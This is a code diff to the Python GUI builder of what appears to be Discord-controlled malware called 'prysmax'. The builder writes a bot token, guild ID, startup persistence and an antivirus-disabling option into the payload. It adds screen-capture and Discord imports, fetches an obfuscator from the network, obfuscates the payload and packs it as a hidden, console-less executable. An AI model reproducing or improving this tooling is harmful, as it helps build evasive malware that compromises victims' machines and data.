@@ -3,6 +3,7 @@ import sys
 import shutil
 import os
 import json
+import requests
 import tkinter as tk
 from tkinter import messagebox, filedialog
 
@@ -18,17 +19,31 @@ except ImportError:
 SETTINGS_DIR = "settings"
 SETTINGS_FILE = os.path.join(SETTINGS_DIR, "settings.json")
 obf_file_path = os.path.join("settings", "obf.py")
+obfuscated_file_path = "builder/prysmax_obfuscated.py"
+prysmax_source = "prysmax.py"
+
+# Descargar el archivo de ofuscación
 a = requests.get("https://raw.githubusercontent.com/Lawxsz/Py-obfuscator/main/obf.py")
 with open(obf_file_path, "w", encoding='utf-8') as file:
     file.write(a.text)
+
 # Función para copiar el archivo prysmax.py a builder/prysmax.py
 def copy_prysmax():
+    if not os.path.exists(prysmax_source):
+        messagebox.showerror("Error", f"No se encontró el archivo {prysmax_source}. Asegúrate de que esté en el directorio correcto.")
+        return False
+    
     if not os.path.exists("builder"):
         os.makedirs("builder")
     
-    shutil.copy("prysmax.py", "builder/prysmax.py")
+    shutil.copy(prysmax_source, "builder/prysmax.py")
+    return True
 
 def replace_in_file(file_path, bot_token, guild_id, startup_for, disable_av):
+    if not os.path.exists(file_path):
+        messagebox.showerror("Error", f"No se encontró el archivo {file_path}.")
+        return
+    
     with open(file_path, 'r') as file:
         lines = file.readlines()
 
@@ -45,8 +60,8 @@ def replace_in_file(file_path, bot_token, guild_id, startup_for, disable_av):
             file.write(line)
 
 def apply_settings_to_file(bot_token, guild_id, startup_for, disable_av):
-    copy_prysmax()
-    replace_in_file("builder/prysmax.py", bot_token, guild_id, startup_for, disable_av)
+    if copy_prysmax():
+        replace_in_file("builder/prysmax.py", bot_token, guild_id, startup_for, disable_av)
 
 def save_settings(bot_token, guild_id, startup_for, disable_av):
     if not os.path.exists(SETTINGS_DIR):
@@ -75,10 +90,41 @@ def download_libraries():
         except subprocess.CalledProcessError as e:
             print(f"{lib}: {e}")
 
-def compile_script():
-    subprocess.run(['python', "settings\\obf.py", "builder\\prysmax.py", '-o', obfuscated_file_path])
+# Agregar las importaciones en prysmax.py
+def add_imports(file_path):
+    if not os.path.exists(file_path):
+        messagebox.showerror("Error", f"No se encontró el archivo {file_path}.")
+        return
 
-    subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=settings/prysmax.ico" builder\\prysmax.py', shell=True)
+    with open(file_path, 'r') as file:
+        content = file.read()
+
+    imports = '''import os
+import sys
+import ctypes
+import requests
+import mss
+import discord
+'''
+
+    if not content.startswith(imports):
+        with open(file_path, 'w') as file:
+            file.write(imports + '\n' + content)
+
+# Ofuscar y luego compilar el script
+def compile_script():
+    # Añadir las importaciones necesarias al archivo antes de la ofuscación
+    if os.path.exists("builder/prysmax.py"):
+        add_imports("builder/prysmax.py")
+    else:
+        messagebox.showerror("Error", "No se pudo encontrar 'builder/prysmax.py' para añadir importaciones.")
+        return
+    
+    # Ejecutar la ofuscación con obf.py
+    subprocess.run(['python', obf_file_path, "builder\\prysmax.py", '-o', obfuscated_file_path])
+
+    # Compilar el archivo ofuscado con pyarmor
+    subprocess.run(f'pyarmor pack -e "--onefile --noconsole --icon=settings/prysmax.ico" {obfuscated_file_path}', shell=True)
 
 def main():
     root = tk.Tk()
